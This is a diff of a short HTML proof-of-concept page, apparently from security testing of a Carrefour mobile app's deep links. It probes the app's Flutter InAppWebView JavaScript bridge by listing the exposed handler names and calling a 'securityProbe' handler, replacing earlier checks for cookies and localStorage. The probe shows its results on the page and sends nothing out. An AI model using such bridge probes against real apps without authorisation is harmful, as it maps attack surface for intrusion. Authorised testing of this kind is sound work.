@@ -1,10 +1,44 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Carrefour Deep-Link Bridge PoC</title>
+</head>
+<body>
+
+<h1>Deep-Link Bridge PoC</h1>
+
+<pre id="output">Testing...</pre>
+
 <script>
-var out =
-    "cookie=" + (document.cookie ? "PRESENT" : "EMPTY") +
-    " | localStorage=" + (localStorage.length > 0 ? "PRESENT" : "EMPTY") +
-    " | UA=" + navigator.userAgent +
-    " | window.open=" + typeof window.open +
-    " | document=" + typeof document;
+var out = "bridge=" + (typeof window.flutter_inappwebview);
+
+if (window.flutter_inappwebview) {
+    out += " keys=" +
+        Object.keys(window.flutter_inappwebview).join(",");
+
+    try {
+        window.flutter_inappwebview
+            .callHandler("securityProbe", "test")
+            .then(function(v) {
+                out += " | securityProbe=>" +
+                    JSON.stringify(v);
+
+                document.getElementById("output").textContent = out;
+            })
+            .catch(function(e) {
+                out += " | securityProbe=ERR";
+                document.getElementById("output").textContent = out;
+            });
+
+    } catch (e) {
+        out += " | securityProbe=THROW";
+        document.getElementById("output").textContent = out;
+    }
+}
 
 document.getElementById("output").textContent = out;
 </script>
+
+</body>
+</html>
